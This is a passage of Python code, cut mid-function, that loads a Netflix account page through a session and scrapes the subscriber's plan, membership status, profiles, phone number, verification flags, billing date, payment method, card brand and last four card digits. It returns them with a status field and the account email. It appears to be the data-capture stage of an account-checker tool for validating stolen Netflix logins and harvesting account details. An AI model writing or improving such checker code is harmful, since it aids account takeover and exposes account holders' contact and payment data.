        r4 = session.get("https://www.netflix.com/account/", headers=account_headers, **req_kwargs)

    acc_src = r4.text

    current_country_code = (
        parse_regex(acc_src, r'"currentCountry"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"currentCountry":"', '"')
    )

    member_plan = unescape_value(
        parse_regex(acc_src, r'"localizedPlanName"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"fieldGroup":"MemberPlan","fields":{"localizedPlanName":{"fieldType":"String","value":"', '"}')
    )

    member_since = unescape_value(
        parse_regex(acc_src, r'"memberSince"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"memberSince":"', '",')
    )

    user_on_hold = (
        parse_regex(acc_src, r'"isUserOnHold"\s*:\s*(true|false)') or
        parse_lr(acc_src, '"growthHoldMetadata":{"__typename":"GrowthHoldMetadata","isUserOnHold":', ",")
    )

    membership_status = (
        parse_regex(acc_src, r'"membershipStatus"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"membershipStatus":"', '",')
    )

    max_streams = (
        parse_regex(acc_src, r'"maxStreams"\s*:\s*\{[^}]*"value"\s*:\s*(\d+)') or
        parse_lr(acc_src, '"maxStreams":{"fieldType":"Numeric","value":', "},")
    )

    video_quality = (
        parse_regex(acc_src, r'"videoQuality"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"videoQuality":{"fieldType":"String","value":"', '"}')
    )

    profiles_section = parse_regex(acc_src, r'"profiles"\s*:\s*(\[.*?\])', 1) or parse_lr(acc_src, '"profiles":', '}"]},' )
    connected_profiles = str(count_occurrences(profiles_section, "guid"))

    extra_member_raw = (
        parse_regex(acc_src, r'"showExtraMemberSection"\s*:\s*\{[^}]*"value"\s*:\s*(true|false)') or
        parse_lr(acc_src, '"showExtraMemberSection":{"fieldType":"Boolean","value":', "},")
    )
    has_extra = "Yes" if extra_member_raw == "true" else "No"

    slot_occupied = (
        parse_regex(acc_src, r'"slotState"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, 'AddOnSlot","fields":{"slotState":{"fieldType":"String","value":"', '"')
    )

    phone_raw = (
        parse_regex(acc_src, r'"phoneNumberDigits"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"phoneNumberDigits":{"__typename":"GrowthClearStringValue","value":"', '"}')
    )
    phone_number = unescape_value(phone_raw)

    num_verified_raw = ""
    if phone_raw:
        num_verified_raw = parse_regex(acc_src, re.escape(phone_raw) + r'[^}]*"isVerified"\s*:\s*(true|false)') or ""
    if not num_verified_raw:
        num_verified_raw = parse_lr(acc_src, '","value":"' + phone_raw + '"},"isVerified":', ",")
    num_verified = "Verified" if num_verified_raw == "true" else "Not Verified"

    email_verified_raw = parse_regex(acc_src, r'"emailAddress".*?"isVerified"\s*:\s*(true|false)') or parse_lr(acc_src, '"},"isVerified":', "},")
    email_verified = "Verified" if email_verified_raw == "true" else "Not Verified"

    next_billing = unescape_value(
        parse_regex(acc_src, r'"nextBillingDate"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"nextBillingDate":{"fieldType":"String","value":"', '"')
    )

    payment_method = (
        parse_regex(acc_src, r'"paymentMethod"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"paymentMethod":{"fieldType":"String","value":"', '"')
    )

    card_brand = (
        parse_regex(acc_src, r'"paymentOptionLogo"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"paymentOptionLogo":"', '"')
    )

    last_4 = (
        parse_regex(acc_src, r'"GrowthCardPaymentMethod"[^}]*"displayText"\s*:\s*"([^"]+)"') or
        parse_lr(acc_src, '"GrowthCardPaymentMethod","displayText":"', '"')
    )

    if "CURRENT_MEMBER" in acc_src and '"CURRENT_MEMBER":true' in acc_src:
        membership = "CURRENT MEMBER"
    elif '"FORMER_MEMBER":true' in acc_src:
        membership = "FORMER MEMBER"
    elif '"NEVER_MEMBER":true' in acc_src:
        membership = "NEVER MEMBER"
    elif '"ANONYMOUS":true' in acc_src:
        membership = "ANONYMOUS"
    else:
        membership = "UNKNOWN"

    price = unescape_value(pr)

    return {
        "status": status,
        "email": email,
        "membership": membership,
        "name": name,
        "country": current_country_code,
        "plan": member_plan,
        "price": price,
        "member_since": member_since,
        "next_billing": next_billing,
        "membership_status": membership_status,
        "on_hold": user_on_hold,
        "max_streams": max_streams,
        "video_quality": video_quality,
        "profiles": connected_profiles,
        "extra_member": has_extra,
        "slot_occupied": slot_occupied,
        "phone": phone_number,
        "phone_verified": num_verified,
        "email_verified": email_verified,
        "payment_method": payment_method,
        "card_brand": card_brand,
        "card_last_4": last_4,
        "netflix_id": nfid,
    }

